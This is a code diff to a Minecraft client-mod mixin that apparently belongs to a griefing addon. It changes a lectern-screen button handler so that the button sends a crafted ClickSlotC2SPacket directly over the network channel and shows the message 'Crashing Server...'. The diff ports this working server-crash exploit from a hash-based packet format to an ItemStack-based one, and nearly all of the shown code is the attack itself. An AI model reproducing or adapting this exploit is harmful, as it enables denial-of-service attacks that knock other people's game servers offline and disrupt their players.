@@ -4,8 +4,6 @@ import com.google.common.collect.Lists;
 import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
 import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
 import meteordevelopment.meteorclient.systems.modules.Modules;
-import net.minecraft.screen.sync.ComponentChangesHash;
-import net.minecraft.screen.sync.ItemStackHash;
 import pwn.noobs.trouserstreak.mixin.accessor.ClientConnectionAccessor;
 import net.minecraft.client.gui.screen.Screen;
 import net.minecraft.client.gui.screen.ingame.LecternScreen;
@@ -44,19 +42,17 @@ public class LecternScreenMixin extends Screen {
                 list.add(slot.getStack().copy());
             }
 
-            Int2ObjectMap<ItemStackHash> int2ObjectMap = new Int2ObjectOpenHashMap<>();
-            ComponentChangesHash.ComponentHasher hasher = client.getNetworkHandler().componentHasher;
+            Int2ObjectMap<ItemStack> int2ObjectMap = new Int2ObjectOpenHashMap<>();
 
             for(int slot = 0; slot < i; ++slot) {
                 ItemStack itemStack = list.get(slot);
                 ItemStack itemStack2 = (defaultedList.get(slot)).getStack();
-                ItemStackHash hash = ItemStackHash.fromItemStack(itemStack2, hasher);
                 if (!ItemStack.areEqual(itemStack, itemStack2)) {
-                    int2ObjectMap.put(slot, hash);
+                    int2ObjectMap.put(slot, itemStack2.copy());
                 }
             }
-            ItemStackHash hash = ItemStackHash.fromItemStack(client.player.currentScreenHandler.getCursorStack(), hasher);
-            ((ClientConnectionAccessor) client.getNetworkHandler().getConnection()).getChannel().writeAndFlush(new ClickSlotC2SPacket(client.player.currentScreenHandler.syncId, client.player.currentScreenHandler.getRevision(), (short) 0, (byte) 0, SlotActionType.QUICK_MOVE, int2ObjectMap, hash));
+
+            ((ClientConnectionAccessor) client.getNetworkHandler().getConnection()).getChannel().writeAndFlush(new ClickSlotC2SPacket(client.player.currentScreenHandler.syncId, client.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, client.player.currentScreenHandler.getCursorStack().copy(), int2ObjectMap));
             client.player.sendMessage(Text.of("Crashing Server..."), false);
             button.active = false;
         })
@@ -64,6 +60,10 @@ public class LecternScreenMixin extends Screen {
                         .size(100, 20)
                         .build()
         );
+
+
+
+
         }
     }
 }
